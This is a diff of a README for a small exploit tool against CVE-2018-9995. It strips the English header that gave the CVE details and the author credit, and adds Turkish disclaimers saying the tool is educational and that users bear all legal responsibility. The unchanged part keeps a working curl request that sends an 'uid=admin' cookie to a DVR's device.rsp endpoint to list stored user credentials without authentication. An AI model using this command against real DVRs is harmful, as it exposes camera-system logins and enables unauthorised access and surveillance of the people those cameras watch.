@@ -1,17 +1,9 @@
-#  [Tool] show DVR Credentiales
 
-	[*] Exploit Title:       "Gets DVR Credentials" 
-	[*] CVE:                 CVE-2018-9995
-	[*] CVSS Base Score v3:  7.3 / 10
-	[*] CVSS Vector String:  CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N  
-	[*] Date:                09/04/2018
-	[*] Exploit Author:      Fernandez Ezequiel ( twitter:@capitan_alfa )
-
-	
-![DVR_wall](screenshot/videoWall.jpg) 
-
-### Exploit:
-
+### Çalıştırma Mantıgı:
+Öncelikle merhabalar
+Kullanım sorumlulugu tarafınıza aittir.
+herhangi bir yasal sorumluluk kabul edilmemektedir.
+eğitim amaclıdır.
 ```
 	$> curl "http://<dvr_host>:<port>/device.rsp?opt=user&cmd=list" -H "Cookie: uid=admin"
 
